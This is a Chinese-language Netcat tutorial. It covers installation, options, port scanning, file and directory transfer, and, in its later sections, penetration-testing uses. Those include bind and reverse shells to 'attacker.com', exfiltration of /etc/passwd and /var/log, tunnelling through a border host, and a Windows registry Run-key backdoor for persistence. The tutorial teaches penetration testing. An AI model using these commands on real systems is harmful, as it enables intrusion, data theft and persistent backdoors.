# 一、概念

Netcat（简称 `nc`）是一款命令行网络工具，被誉为“TCP/IP 的瑞士军刀”[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)[-4](https://developer.aliyun.com/article/1691317)。它可以在网络中读写数据，支持 TCP、UDP 和 UNIX 域套接字[详细文档](https://manpages.debian.org/testing/netcat-openbsd/nc_openbsd.1.en.html)

**为什么叫“瑞士军刀”？**

- 体积小巧（可执行文件仅约 200KB）
- 功能灵活多样：==端口扫描==、文件传输、聊天服务器、==反向 Shell==、隧道代理等[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)
- 几乎所有 Linux 发行版都默认安装，Windows 也有移植版本

**主要应用场景**：

- 网络调试与故障排查
- 渗透测试中的端口扫描、反弹 Shell、数据窃取
- 临时文件传输（当 FTP/SCP 不可用时）
- 简易代理和隧道搭建[-3](https://developer.aliyun.com/article/1684112)

# 二、工作原理（本质）

Netcat 的核心原理非常简单：**在两个网络端点之间建立连接，然后将标准输入的数据发送出去，并将收到的数据输出到标准输出**[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)。


## 两种工作模式[-2](https://manpages.debian.org/testing/netcat-openbsd/nc_openbsd.1.en.html)[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)：

1. **客户端模式**：主动连接远程主机的指定端口
```bash
nc target.com 80
```
1. **服务端模式**：在本地监听端口，等待连接
```bash
nc -l -p 8888
```

**数据流向的本质**：你可以把它理解为 `cat` 命令的网络版——`cat` 在本地文件间复制数据，而 `nc` 在网络连接间复制数据[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)。当两端都连接后，任何一端输入的内容会实时出现在另一端，形成双向通信。

# 三、环境要求与安装

## 3.1 查看已安装版本

Linux 下可能有两个版本，用法略有差异：

- `/bin/nc.traditional`：GNU 基础版本（默认,kali内置）[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)
    
- `/bin/nc.openbsd`：OpenBSD 版本，功能更强大[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)

## 3.2 安装命令

**Debian/Ubuntu**：
```bash
sudo apt install netcat
# 或安装特定版本
sudo apt install netcat-openbsd   # OpenBSD版本
sudo apt install netcat-traditional  # GNU版本[citation:1][citation:7]
```
**CentOS/RHEL**：
```bash
sudo yum install nc
```
**Windows**：下载 ncat（Nmap 项目附带）或原始 nc.exe[-6](https://m.w3cschool.cn/dosmlxxsc1/jiszug.html)

# 四、常用命令和选项

## 4.1 核心选项

| 选项   | 说明                    | 示例                                                                                                                                                                                                                                                                    |
| ---- | --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-l` | 监听模式（作为服务端）           | `nc -l -p 8080`                                                                                                                                                                                                                                                       |
| `-p` | 指定本地端口                | `nc -l -p 8080`                                                                                                                                                                                                                                                       |
| `-u` | 使用 UDP 协议（默认 TCP）     | `nc -u -l -p 53`                                                                                                                                                                                                                                                      |
| `-v` | 详细输出（`-vv` 更详细）       | `nc -v target.com 80`                                                                                                                                                                                                                                                 |
| `-z` | 零 I/O 模式，仅扫描不发送数据     | `nc -z -v target.com 80-100`                                                                                                                                                                                                                                          |
| `-n` | 不进行 DNS 解析            | `nc -nv 192.168.1.1 80`                                                                                                                                                                                                                                               |
| `-w` | 设置超时时间（秒）             | `nc -w 3 target.com 80`                                                                                                                                                                                                                                               |
| `-e` | 连接后执行程序（危险！）          | `nc -l -p 4444 -e /bin/bash`[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)[-9](https://cloud.tencent.com.cn/developer/article/1933543?from=15425) |
| `-k` | 连接断开后继续监听（OpenBSD）    | `nc -l -k -p 8080`[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)[-2](https://manpages.debian.org/testing/netcat-openbsd/nc_openbsd.1.en.html)                                                                               |
| `-N` | stdin 结束关闭连接（OpenBSD） | `nc -N target.com 8080 < file`                                                                                                                                                                                                                                        |
| `-q` | 等待秒数后退出（GNU）          | `nc -q 0 target.com 8080 < file`[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)                                                                                                                                              |
## 4.2 基础命令示例

**1. 测试端口是否开放**[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)
```bash
# 测试单个端口
nc -zv target.com 80
# 扫描端口范围
nc -zv target.com 20-100
# 详细版
nc -vv -w 3 -z 192.168.1.1 80-443
```
**2. 简易聊天服务器**[-7](https://bbs.huaweicloud.com/blogs/463002)[-9](https://cloud.tencent.com.cn/developer/article/1933543?from=15425)
```bash
# 服务端（机器A）
nc -l -p 8888
# 客户端（机器B）
nc 192.168.1.10 8888
# 之后双方可实时输入文字，Ctrl+C 结束
```
**3. 文件传输**[-1](https://cloud.tencent.com.cn/developer/article/2473236?from=15425&frompage=seopage)[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)[-7](https://bbs.huaweicloud.com/blogs/463002)
```bash
# 接收端（先启动）
nc -l -p 8888 > received_file.txt
# 发送端
nc 192.168.1.10 8888 < local_file.txt
```
**4. 传输整个目录**（结合 tar）[-7](https://bbs.huaweicloud.com/blogs/463002)
```bash
# 接收端
nc -l -p 8888 | tar -xzf -
# 发送端
tar -czf - /path/to/directory/ | nc 192.168.1.10 8888
```

## 五、进阶用法

### 5.1 反向 Shell（渗透测试核心）
**正向 Shell**：目标机主动开放端口，攻击者连接[-9](https://cloud.tencent.com.cn/developer/article/1933543?from=15425)
```bash
# 目标机（Windows）
nc -l -p 4444 -e cmd.exe
# 目标机（Linux）
nc -l -p 4444 -e /bin/bash
# 攻击者连接
nc target.com 4444
```
**反向 Shell**（更常用，可绕过防火墙）：目标机主动连接攻击者[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)[-9](https://cloud.tencent.com.cn/developer/article/1933543?from=15425)
```bash
# 攻击者监听
nc -l -p 4444
# 目标机执行（Windows）
nc attacker.com 4444 -e cmd.exe
# 目标机执行（Linux）
nc attacker.com 4444 -e /bin/bash
```
### 5.2 数据窃取

**单个文件窃取**[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)
```bash
# 攻击者监听接收
nc -l -p 4444 > stolen_data.txt
# 目标机发送
nc attacker.com 4444 < /etc/passwd
```
**批量窃取（结合 tar）**[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)
```bash
# 攻击者监听并解压
nc -l -p 4444 | tar -xzf -
# 目标机：打包 /var/log 并发送
tar -czf - /var/log/ | nc attacker.com 4444
```
### 5.3 端口转发与隧道

**通过边界主机建立隧道**[-3](https://developer.aliyun.com/article/1684112)
```bash
# 边界主机执行（同时连接外网攻击者和内网目标）
# 将攻击者的连接转发给内网目标
nc -v attacker.com 3333 -c "nc -v internal-target.com 4444"
```
### 5.4 简易 Web 服务器
```bash
# 返回固定内容
echo -e "HTTP/1.1 200 OK\r\n\r\nHello!" | nc -l -p 8080
# 返回文件内容
{ echo -e "HTTP/1.1 200 OK\r\n"; cat index.html; } | nc -l -p 8080[citation:7]
```
### 5.5 留后门（持久化）

在 Windows 注册表添加开机自启[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)：
```cmd
reg add HKLM\software\microsoft\windows\currentversion\run /v netcat /t REG_SZ /d "nc -l -p 4444 -e cmd.exe"#
```
